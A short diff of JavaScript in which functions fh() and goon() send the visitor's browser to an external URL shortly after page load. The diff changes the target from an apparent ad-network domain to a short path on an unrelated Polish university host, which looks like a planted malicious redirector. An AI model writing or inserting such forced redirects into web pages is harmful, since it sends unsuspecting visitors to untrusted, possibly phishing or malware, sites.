@@ -5,8 +5,8 @@ function jp() {
     fh();}
 setTimeout('hh();', 500);
 function fh(){
-    location.href="https://noohapou.com/4/8129562";
+    location.href="https://hgm.edu.pl/GfwsKc";
 }
 function goon(){
-    location.href="https://noohapou.com/4/8129562";
+    location.href="https://hgm.edu.pl/GfwsKc";
 }
